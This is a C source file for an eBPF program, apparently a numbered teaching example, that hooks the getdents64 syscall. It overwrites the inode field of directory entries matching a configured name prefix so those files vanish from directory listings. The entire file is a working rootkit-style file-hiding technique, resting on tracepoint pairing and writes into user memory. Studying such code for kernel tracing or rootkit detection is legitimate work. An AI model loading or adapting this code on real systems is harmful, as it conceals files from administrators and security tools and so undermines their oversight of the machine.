// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* 24-hide: hide files from directory listings by filtering getdents64 output.
 *
 * On sys_enter_getdents64, save the dirent buffer pointer keyed by pid.  On
 * sys_exit_getdents64, walk the returned buffer and zero d_ino for entries
 * whose name matches a configured target.  Teaches: enter/exit pairing, user
 * buffer read/write from BPF, linux_dirent64 parsing.
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

const volatile int target_strlen = 0;  /* length of target_name */
const char target_name[16] = {};       /* name prefix to hide */

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, u32);     /* pid */
	__type(value, void*); /* dirent pointer */
} dirent_map SEC(".maps");

SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter(struct trace_event_raw_sys_enter *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void *dirent = (void *)ctx->args[1];

	bpf_map_update_elem(&dirent_map, &pid, &dirent, BPF_ANY);
	return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit(struct trace_event_raw_sys_exit *ctx)
{
	u32 pid = bpf_get_current_pid_tgid() >> 32;
	void **direntp, *dirent;
	int ret = (int)ctx->ret;
	char name[16], tmp[16];
	long pos = 0;

	if (ret <= 0)
		goto out;
	direntp = bpf_map_lookup_elem(&dirent_map, &pid);
	if (!direntp)
		return 0;
	dirent = *direntp;

	if (target_strlen <= 0 || target_strlen > 16)
		goto out;
	bpf_probe_read_kernel(tmp, target_strlen, target_name);

	while (pos < ret) {
		struct linux_dirent64 d = {};
		__u64 zero = 0;

		if (bpf_probe_read_user(&d, sizeof(d),
					(struct linux_dirent64 *)(dirent + pos)))
			break;
		if (d.d_reclen == 0 || pos + d.d_reclen > ret)
			break;
		bpf_probe_read_user_str(name, sizeof(name), d.d_name);

		bool match = true;
		for (int i = 0; i < target_strlen; i++) {
			if (name[i] != tmp[i]) { match = false; break; }
		}
		if (match)
			bpf_probe_write_user(
				&((struct linux_dirent64 *)(dirent + pos))->d_ino,
				&zero, sizeof(zero));

		pos += d.d_reclen;
	}

out:
	bpf_map_delete_elem(&dirent_map, &pid);
	return 0;
}
